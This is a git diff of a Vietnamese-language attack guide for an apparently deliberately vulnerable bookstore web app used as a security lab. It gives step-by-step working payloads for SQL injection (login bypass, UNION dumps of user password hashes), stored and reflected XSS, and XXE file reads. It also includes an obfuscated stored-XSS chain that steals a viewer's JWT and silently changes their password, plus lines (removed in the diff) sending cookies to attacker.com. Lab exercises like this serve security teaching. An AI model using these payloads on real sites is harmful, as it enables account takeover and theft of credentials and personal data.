@@ -7,15 +7,13 @@
 | 1 | [SQLi — Tìm kiếm sách](#1-sql-injection--tìm-kiếm-sách) | SQL Injection | Cao |
 | 2 | [SQLi — Quick Search](#2-sql-injection--quick-search) | SQL Injection | Cao |
 | 3 | [SQLi — Đăng nhập (Authentication Bypass)](#3-sql-injection--đăng-nhập-authentication-bypass) | SQL Injection | Nghiêm trọng |
-| 4 | [SQLi — Kiểm tra email (Data Leak)](#4-sql-injection--kiểm-tra-email-data-leak) | SQL Injection | Cao |
-| 5 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#5-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
-| 6 | [Stored XSS — Đánh giá sách](#6-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
-| 7 | [Reflected XSS — Trang tìm kiếm](#7-reflected-xss--trang-tìm-kiếm) | XSS | Trung bình |
-| 8 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#8-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
-| 9 | [XXE — Import sách bằng XML](#9-xxe--import-sách-bằng-xml) | XXE | Nghiêm trọng |
-| 10 | [IDOR — Xem profile user bất kỳ](#10-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
-| 11 | [Sensitive Data Exposure — Lộ password hash toàn bộ user](#11-sensitive-data-exposure--lộ-password-hash-toàn-bộ-user) | Sensitive Data Exposure | Nghiêm trọng |
-| 12 | [Security Misconfiguration — Stack trace + Error message leak](#12-security-misconfiguration--stack-trace--error-message-leak) | Security Misconfiguration | Cao |
+| 4 | [SQLi — Đổi mật khẩu (Bypass currentPassword)](#4-sql-injection--đổi-mật-khẩu-bypass-currentpassword) | SQL Injection | Nghiêm trọng |
+| 5 | [Stored XSS — Đánh giá sách](#5-stored-xss--đánh-giá-sách) | XSS | Nghiêm trọng |
+| 6 | [CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản](#6-csrf--kết-hợp-stored-xss--sqli-chiếm-tài-khoản) | CSRF | Nghiêm trọng |
+| 7 | [XXE — Import sách bằng XML](#7-xxe--import-sách-bằng-xml) | XXE | Nghiêm trọng |
+| 8 | [IDOR — Xem profile user bất kỳ](#8-idor--xem-profile-user-bất-kỳ) | Broken Access Control | Cao |
+| 9 | [Sensitive Data Exposure — Lộ password hash toàn bộ user](#9-sensitive-data-exposure--lộ-password-hash-toàn-bộ-user) | Sensitive Data Exposure | Nghiêm trọng |
+| 10 | [Security Misconfiguration — Stack trace + Error message leak](#10-security-misconfiguration--stack-trace--error-message-leak) | Security Misconfiguration | Cao |
 
 ---
 
@@ -52,6 +50,7 @@ String sql = "SELECT b.id, b.title, b.author, b.isbn, b.price, b.description, " 
 ```
 ' OR '1'='1' --
 ```
+https://localhost:8443/api/books/search?q=a' OR '1'='1
 
 **Bước 4:** Nhấn Enter hoặc nút tìm kiếm
 
@@ -64,14 +63,6 @@ AND (b.title = '' OR '1'='1' --' OR b.author = '...')
 ```
 - `' OR '1'='1'` → điều kiện luôn đúng → trả về tất cả
 - `--` → comment phần SQL còn lại
-
-### Payload nâng cao — UNION SELECT lấy thông tin user
-
-```
-' UNION SELECT 1, username, email, password_hash, 0, '', '', 0, '', now(), now(), 'active', 0, '', 0, 0, 0, 0 FROM users --
-```
-
-**Kết quả:** Trả về danh sách "sách" nhưng thực chất là thông tin user (username, email, password hash).
 
 ---
 
@@ -105,7 +96,7 @@ String sql = BASE_SELECT +
 ```
 ') OR ('1'='1
 ```
-
+https://localhost:8443/api/books/search?q=') OR ('1'='1
 **Bước 3:** Quan sát dropdown kết quả
 
 **Kết quả:** Hiển thị toàn bộ sách đang active.
@@ -190,68 +181,7 @@ Thay `'admin'` bằng `'seller'` để login quyền seller:
 
 ---
 
-## 4. SQL Injection — Kiểm tra email (Data Leak)
-
-### Thông tin lỗ hổng
-
-- **Loại:** SQL Injection + Information Disclosure
-- **File:** `src/main/java/web/AuthServlet.java` — dòng 56
-- **Endpoint:** `GET /api/login?email=<payload>`
-
-### Code lỗi
-
-```java
-String sql = "SELECT id, email, full_name, role, status " +
-             "FROM users WHERE email = '" + email.trim() + "'";
-```
-
-**Nguyên nhân:** Parameter `email` ghép trực tiếp vào SQL.
-
-### Cách tấn công chi tiết
-
-**Bước 1:** Mở trình duyệt hoặc dùng DevTools Console (F12)
-
-**Bước 2:** Gọi API:
-
-```javascript
-// Cách 1: Gõ trực tiếp trên thanh URL
-// https://localhost:8443/api/login?email=' OR '1'='1' --
-
-// Cách 2: Dùng fetch trong Console
-fetch("/api/login?email=' OR '1'='1' --")
-  .then(r => r.json())
-  .then(data => console.log(data));
-```
-
-**Kết quả:** Server trả về thông tin user đầu tiên trong bảng:
-```json
-{
-  "exists": true,
-  "email": "admin@bookstore.vn",
-  "name": "Admin User",
-  "role": "admin"
-}
-```
-
-**Bước 3 — Liệt kê tất cả user:** Dùng UNION SELECT với OFFSET:
-
-```
-/api/login?email=' UNION SELECT 1, email, full_name, role, status FROM users LIMIT 1 OFFSET 0 --
-```
-
-Thay `OFFSET 0` thành `OFFSET 1`, `OFFSET 2`, ... để lấy từng user.
-
-**Bước 4:** Attacker thu thập được danh sách:
-- Email tất cả user
-- Họ tên
-- Role (admin, seller, customer)
-- Trạng thái tài khoản
-
-→ Dùng thông tin này để tấn công tiếp (brute force password, phishing có chủ đích).
-
----
-
-## 5. SQL Injection — Đổi mật khẩu (Bypass currentPassword)
+## 4. SQL Injection — Đổi mật khẩu (Bypass currentPassword)
 
 ### Thông tin lỗ hổng
 
@@ -330,7 +260,7 @@ fetch('/api/profile/password', {
 
 ---
 
-## 6. Stored XSS — Đánh giá sách
+## 5. Stored XSS — Đánh giá sách
 
 ### Thông tin lỗ hổng
 
@@ -391,56 +321,7 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 
 → Token JWT và cookie nạn nhân bị gửi về server attacker.
 
----
-
-## 7. Reflected XSS — Trang tìm kiếm
-
-### Thông tin lỗ hổng
-
-- **Loại:** Reflected XSS
-- **File:** `src/main/java/web/BooksApiServlet.java` — dòng 166-167
-- **Endpoint:** `GET /api/books/search-result?q=<payload>`
-
-### Code lỗi
-
-```java
-writer.println("<h2>Kết quả tìm kiếm cho: " + keyword + "</h2>");
-writer.println("<p>Bạn đã tìm kiếm: <strong>" + keyword + "</strong></p>");
-```
-
-**Nguyên nhân:** Biến `keyword` từ parameter `q` được ghi thẳng vào HTML response mà không escape.
-
-### Cách tấn công chi tiết
-
-**Bước 1:** Attacker tạo link chứa payload:
-
-```
-https://localhost:8443/api/books/search-result?q=<img src=x onerror="alert(document.cookie)">
-```
-
-**Bước 2:** Gửi link này cho nạn nhân qua email, chat, mạng xã hội, v.v.
-
-Ví dụ: "Em ơi, sách này đang giảm giá nè: [link]"
-
-**Bước 3:** Nạn nhân click link
-
-**Kết quả:** Trình duyệt nạn nhân nhận HTML response:
-```html
-<h2>Kết quả tìm kiếm cho: <img src=x onerror="alert(document.cookie)"></h2>
-```
-→ JavaScript chạy trên trình duyệt nạn nhân
-
-### Payload nâng cao — Redirect đến trang phishing
-
-```
-https://localhost:8443/api/books/search-result?q=<script>window.location='https://attacker.com/phishing?cookie='+document.cookie</script>
-```
-
-→ Nạn nhân bị redirect sang trang giả mạo, cookie bị đánh cắp.
-
----
-
-## 8. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản
+## 6. CSRF — Kết hợp Stored XSS + SQLi chiếm tài khoản
 
 ### Thông tin lỗ hổng
 
@@ -465,9 +346,21 @@ https://localhost:8443/api/books/search-result?q=<script>window.location='https:
 
 **Bước 3:** Vào trang chi tiết sách đã mua, viết đánh giá với nội dung:
 
+> ⚠️ **QUAN TRỌNG:** Copy chính xác payload bên dưới (bao gồm cả phần text trước thẻ `<img`). Phải copy từ **raw markdown** (nhấn nút Raw trên GitHub), KHÔNG copy từ trang đã render.
+
 ```
-Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="var t=localStorage.getItem('auth_token');if(t){fetch('/api/profile/password',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({currentPassword:&quot;' OR '1'='1'--&quot;,newPassword:'hacked_csrf',confirmPassword:'hacked_csrf'})})}">
+Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror='var t=localStorage.getItem("auth_token");if(t){fetch("/api/profile/password",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+t},body:atob("eyJjdXJyZW50UGFzc3dvcmQiOiInIE9SICcxJz0nMSctLSIsIm5ld1Bhc3N3b3JkIjoiaGFja2VkX2NzcmYiLCJjb25maXJtUGFzc3dvcmQiOiJoYWNrZWRfY3NyZiJ9")})}'>
 ```
+
+**Giải thích payload:**
+- Phần text đầu: nội dung đánh giá bình thường (>50 ký tự để pass validation)
+- `<img src=x>`: tạo thẻ img với src không hợp lệ → chắc chắn gây lỗi
+- `onerror='...'`: dùng dấu nháy đơn `'` bao ngoài → bên trong thoải mái dùng dấu nháy kép `"`
+- `atob("eyJ...")`: giải mã base64 → ra JSON body:
+  ```json
+  {"currentPassword":"' OR '1'='1'--","newPassword":"hacked_csrf","confirmPassword":"hacked_csrf"}
+  ```
+- Dùng base64 để tránh vấn đề dấu nháy khi copy-paste
 
 **Bước 4:** Nhấn "Gửi đánh giá" → Payload XSS được lưu vào database
 
@@ -477,12 +370,13 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 
 **Bước 6:** Trang load đánh giá → `${r.comment}` render thẻ `<img>` → `onerror` kích hoạt → JavaScript chạy tự động:
 
-1. `localStorage.getItem('auth_token')` → lấy JWT token nạn nhân
-2. `fetch('/api/profile/password', ...)` → gửi request đổi mật khẩu:
+1. `localStorage.getItem("auth_token")` → lấy JWT token nạn nhân (người đang xem)
+2. `atob("eyJ...")` → giải mã base64 → JSON body chứa SQLi payload
+3. `fetch("/api/profile/password", ...)` → gửi request đổi mật khẩu:
    - `currentPassword: "' OR '1'='1'--"` → SQLi bypass (lỗ hổng #5)
-   - `newPassword: 'hacked_csrf'`
-   - `confirmPassword: 'hacked_csrf'`
-3. Server nhận request → BCrypt check fail → fallback legacy SQL → SQLi bypass → **mật khẩu nạn nhân bị đổi thành `hacked_csrf`**
+   - `newPassword: "hacked_csrf"`
+   - `confirmPassword: "hacked_csrf"`
+4. Server nhận request → BCrypt check fail → fallback legacy SQL → SQLi bypass → **mật khẩu nạn nhân bị đổi thành `hacked_csrf`**
 
 **Bước 7:** Nạn nhân **không hay biết** — trang hiển thị bình thường, không popup, không redirect
 
@@ -496,14 +390,14 @@ Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong tr
 
 1. Mở DevTools (F12) → tab **Network**
 2. Truy cập trang sách có review độc hại
-3. Quan sát: thấy request `POST /api/profile/password` tự động gửi
-4. Response: `{"success":true,"message":"Password changed successfully"}`
+3. Quan sát: thấy request `POST /api/profile/password` tự động gửi đi
+4. Click vào request đó → tab **Response** → thấy: `{"success":true,"message":"Password changed successfully"}`
 5. Logout → login lại bằng mật khẩu cũ → **Thất bại**
-6. Login bằng `hacked_csrf` → **Thành công**
+6. Login bằng mật khẩu `hacked_csrf` → **Thành công** → tài khoản bị chiếm
 
 ---
 
-## 9. XXE — Import sách bằng XML
+## 7. XXE — Import sách bằng XML
 
 ### Thông tin lỗ hổng
 
@@ -626,7 +520,7 @@ fetch('/api/books/import', {
 
 ---
 
-## 10. IDOR — Xem profile user bất kỳ
+## 8. IDOR — Xem profile user bất kỳ
 
 ### Thông tin lỗ hổng
 
@@ -699,13 +593,15 @@ for (let i = 1; i <= 100; i++) {
         }
     });
 }
+
+hoặc vd: https://localhost:8443/api/profile/user-info?userId=199
 ```
 
 **Thông tin bị lộ:** Email, SĐT, địa chỉ nhà, ngày sinh, role (admin/seller/customer), trạng thái tài khoản.
 
 ---
 
-## 11. Sensitive Data Exposure — Lộ password hash toàn bộ user
+## 9. Sensitive Data Exposure — Lộ password hash toàn bộ user
 
 ### Thông tin lỗ hổng
 
@@ -785,7 +681,7 @@ https://localhost:8443/api/profile/export
 
 ---
 
-## 12. Security Misconfiguration — Stack Trace + Error Message Leak
+## 10. Security Misconfiguration — Stack Trace + Error Message Leak
 
 ### Thông tin lỗ hổng
 
@@ -899,12 +795,10 @@ java.sql.SQLException: ERROR: relation "users" does not exist
 | 1 | SQLi tìm sách | SQLi | `GET /api/books/search?q=` | `' OR '1'='1' --` |
 | 2 | SQLi quick search | SQLi | `GET /api/books/search?q=` | `') OR ('1'='1` |
 | 3 | SQLi login bypass | SQLi | `POST /api/login` | `' UNION SELECT 1,'admin','a@b.c','','admin','active' --` |
-| 4 | SQLi data leak | SQLi | `GET /api/login?email=` | `' OR '1'='1' --` |
-| 5 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
-| 6 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
-| 7 | Reflected XSS | XSS | `GET /api/books/search-result?q=` | `<img src=x onerror="alert(1)">` |
-| 8 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
-| 9 | XXE | XXE | `POST /api/books/import` | `<!ENTITY xxe SYSTEM "file:///...">` |
-| 10 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
-| 11 | Data Exposure | Sensitive Data | `GET /api/profile/export` | Trả về password hash |
-| 12 | Misconfiguration | Security Misconfig | Gây lỗi SQL | Error message + stack trace |
+| 4 | SQLi đổi pass | SQLi | `POST /api/profile/password` | currentPassword: `' OR '1'='1'--` |
+| 5 | Stored XSS | XSS | Review sách | `<img src=x onerror="...">` |
+| 6 | CSRF chain | CSRF+XSS+SQLi | Review sách → `/api/profile/password` | Stored XSS auto-submit |
+| 7 | XXE | XXE | `POST /api/books/import` | `<!ENTITY xxe SYSTEM "file:///...">` |
+| 8 | IDOR | Broken Access | `GET /api/profile/user-info?userId=` | `userId=1,2,3...` |
+| 9 | Data Exposure | Sensitive Data | `GET /api/profile/export` | Trả về password hash |
+| 10 | Misconfiguration | Security Misconfig | Gây lỗi SQL | Error message + stack trace |
